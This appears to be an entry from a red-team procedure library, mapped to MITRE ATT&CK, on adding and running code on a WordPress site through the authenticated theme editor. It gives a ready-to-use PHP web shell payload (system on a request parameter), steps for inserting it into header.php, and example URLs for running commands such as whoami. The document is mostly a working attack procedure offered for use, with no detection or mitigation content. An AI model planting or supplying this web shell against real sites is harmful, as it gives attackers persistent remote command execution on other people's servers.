---
id: b7610af2-a35e-4234-b5be-bd8a5dfc9340
name: Add and Execute Code on a WordPress Site (Authenticated)
type: procedure
verified: true
submitted: true
created_at: '2019-10-09T19:05:45.750790+00:00'
updated_at: '2023-05-26T01:12:06.411264+00:00'
tactics:
- '[[Persistence|TA0003 - Persistence]]'
- '[[Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
- '[[Web Shell|T1100 - Web Shell]]'
tags:
- '[[shell]]'
- '[[Web Applications]]'
---

# Add and Execute Code on a WordPress Site (Authenticated)

**Status**: ✓ Verified

## Summary

Authenticated users with the ability to edit themes can easily add PHP code to a WordPress site, which will be executed as the web application's user. 

## Description

# Description

Authenticated users with the ability to edit themes can easily add PHP code to a WordPress site, which will be executed as the web application's user.

# Instructions

1. Select a payload. Suggested:

**Code**: [[<?php system($_REQUEST['cmd']); ?>]]

2. Log into the WordPress site, then select Themes > Editor

3. Select a page to modify in the right hand menu. The Header page (header.php) is selected since it is loaded on most pages, therefore easy to trigger the code.

4. Add the PHP payload to the file, then click 'Update File'

5. Browse to a page on the site which includes the header.php (the root page of the site should be sufficient). In order to execute commands using the payload, 'cmd=<COMMAND' is appended to the URL as an argument.

For example, if the URL is: 

[http://10.10.10.10/blog](http://10.10.10.10/blog)

Commands can be executed by browsing to:

[http://10.10.10.10/blog?cmd=whoami](http://10.10.10.10/blog?cmd=whoami)

## MITRE ATT&CK Mapping

### Tactics

- [[Persistence|TA0003 - Persistence]]
- [[Privilege Escalation|TA0004 - Privilege Escalation]]

### Techniques

- [[Web Shell|T1100 - Web Shell]]

## Tags

- [[shell]]
- [[Web Applications]]
